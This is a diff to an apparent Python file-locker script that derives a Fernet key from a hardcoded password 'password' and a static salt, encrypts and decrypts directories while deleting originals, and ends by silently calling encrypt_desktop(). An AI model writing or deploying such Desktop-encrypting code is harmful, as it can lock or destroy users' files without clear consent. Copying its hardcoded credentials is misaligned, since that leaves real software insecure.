@@ -18,8 +18,7 @@ if not is_admin():
     )
     sys.exit()
 
-# Generate a random salt
-SALT = b"your_random_salt_here"  # Replace with securely stored salt
+SALT = b"your_random_salt_here"
 
 password = "password"
 
@@ -31,7 +30,11 @@ key = derive_key(password)
 
 def validate_password(input_password):
     """Check if the provided password is correct."""
-    return derive_key(input_password) == key
+    try:
+        return derive_key(input_password) == key
+    except Exception as e:
+        print(f"Validation error: {e}")
+        return False
 
 def encrypt_directory(directory, key):
     try:
@@ -72,7 +75,7 @@ def decrypt_directory(directory, key):
             return
         
         f = Fernet(key)
-        log_file_path = os.path.join(directory, "decryption_log.txt")  # Log file for decrypted files
+        log_file_path = os.path.join(directory, "decryption_log.txt")
         with open(log_file_path, "w") as log_file:
             for root, _, files in os.walk(directory):
                 for file in files:
@@ -80,26 +83,21 @@ def decrypt_directory(directory, key):
                         continue
                     filepath = os.path.join(root, file)
                     try:
-                        # Read the encrypted file
+                        print(f"Processing file: {filepath}")
                         with open(filepath, "rb") as file_obj:
                             encrypted_data = file_obj.read()
-                        
-                        # Decrypt the data
+
                         decrypted_data = f.decrypt(encrypted_data)
-                        
-                        # Create the new filepath by removing the ".enc" extension
+
                         decrypted_filepath = filepath.rsplit(".enc", 1)[0]
                         
-                        # Save the decrypted data to the new file
                         with open(decrypted_filepath, "wb") as file_obj:
                             file_obj.write(decrypted_data)
                         
-                        # Log the decrypted file
                         log_file.write(f"Decrypted: {decrypted_filepath}\n")
                         
-                        # Remove the old .enc file
                         os.remove(filepath)
-                        print(f"Decrypted and removed .enc: {filepath}")
+                        print(f"Successfully decrypted and removed: {filepath}")
                     except Exception as e:
                         print(f"Failed to decrypt {filepath}: {e}")
         
@@ -128,6 +126,4 @@ if __name__ == "__main__":
 
     root.mainloop()
 
-    print("Encrypting files on Desktop...")
     encrypt_desktop()
-    print("Encryption completed.")
